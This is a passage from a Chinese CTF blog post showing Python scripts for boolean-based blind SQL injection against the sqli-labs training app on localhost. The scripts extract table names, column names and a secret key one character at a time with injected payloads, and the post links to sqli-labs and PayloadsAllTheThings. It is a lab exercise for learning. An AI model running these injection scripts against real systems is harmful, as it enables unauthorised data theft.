         mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>                resp = send_request(i,mid)<br>               <br>                <span class="hljs-keyword">if</span> database_i_ascii_bt_mid(resp):<br>                    head=mid+<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    tail=mid<br>            <span class="hljs-keyword">if</span>(head!=<span class="hljs-number">32</span>):<br>                database+=<span class="hljs-built_in">chr</span>(head)<br>                <span class="hljs-built_in">print</span>(database)<br>        self.database = database<br>        <span class="hljs-built_in">print</span>(database)<br>    <br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    BoolSqlier.url = <span class="hljs-string">&quot;http://localhost:12345/Less-5/&quot;</span><br>    sqli = BoolSqlier()<br>    sqli.get_database()<br></code></pre></td></tr></table></figure>

<h4 id="面向过程"><a href="#面向过程" class="headerlink" title="面向过程"></a>面向过程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>session = requests.session()<br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-65/&quot;</span><br>what_i_want = <span class="hljs-string">&quot;&quot;</span><br>table_name = <span class="hljs-string">&quot;&quot;</span><br>column_name = <span class="hljs-string">&quot;&quot;</span><br>key = <span class="hljs-string">&quot;&quot;</span><br>count = <span class="hljs-number">0</span><br>text = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1\&quot;) and ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;table_name&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    table_name+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(table_name)<br>    count = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is Your Loved table_name!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(table_name)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1\&quot;) and ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(table_name,i,mid)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;column_name&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    column_name+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(column_name)<br>    count = <span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> re<br>pattern = <span class="hljs-string">&quot;secret_....&quot;</span><br>column_name = re.findall(pattern,column_name)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is Your Loved column_name!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(column_name)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1\&quot;) and ascii(mid((select group_concat(&#123;&#125;) from challenges.&#123;&#125;),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(column_name,table_name,i,mid)<br>        <span class="hljs-built_in">print</span>(payload)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <span class="hljs-comment">#print(resp.text)</span><br>        <span class="hljs-comment"># if mid==79:</span><br>        <span class="hljs-comment">#     print(resp.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    key+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(key)<br>    count = <span class="hljs-number">0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is your loved key!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(key)<br></code></pre></td></tr></table></figure>



<h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><ul>
<li><p>MYSQL注入天书</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lcamry/sqli-labs">https://github.com/lcamry/sqli-labs</a></p>
</li>
<li><p>PayloadsAllTheThings</p>
<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md</a></p>
</li>
</ul>
<blockquote>
<p> 好了，完结撒花</p>
</blockquote>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/sqli/">sqli</a>
                    
                      <a class="hover-with-bg" href="/tags/web/">web</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/02/23/first%20blog%20of%20%E5%9C%B0%E6%9D%BF%E7%A0%96b1ub1u/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">first blog of 地板砖b1ub1u</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>hexo</span></a> <i class="iconfont icon-love"></i> <a href="http://www.gofervor.com/" target="_blank" rel="nofollow noopener"><span>b1ub1u</span></a> 
  </div>
  

  
  <!-- 备案信息 -->
  <div class="beian">
    <span>
      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
        皖ICP备2021017950号
      </a>
    </span>
    
  </div>


  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>














  
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/containsWord.min.js"></script>



<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/nico.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
</html>
